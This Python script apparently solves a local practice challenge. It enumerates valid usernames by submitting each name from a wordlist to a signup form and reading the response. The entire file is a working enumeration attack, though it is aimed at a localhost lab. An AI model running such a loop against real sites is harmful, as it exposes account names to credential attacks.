import requests

usernames = open("users.txt", 'r').read().split('\n')


def Ch2(url, user):
    data = {
        "username": user,
        "password": "Mostafa",
        "confpassword": "Mostafa",
        "signup": "Signup"
        }
    req =requests.post(url, data).text
    if "Success" in req:
        print(f"Invalid Username ===> {user}")
    else:
        print(f"Valid Username ===> {user}") #greeneks
        exit()

url = "http://localhost/CIS/ch2/signup.php"
for user in usernames:
    Ch2(url, user)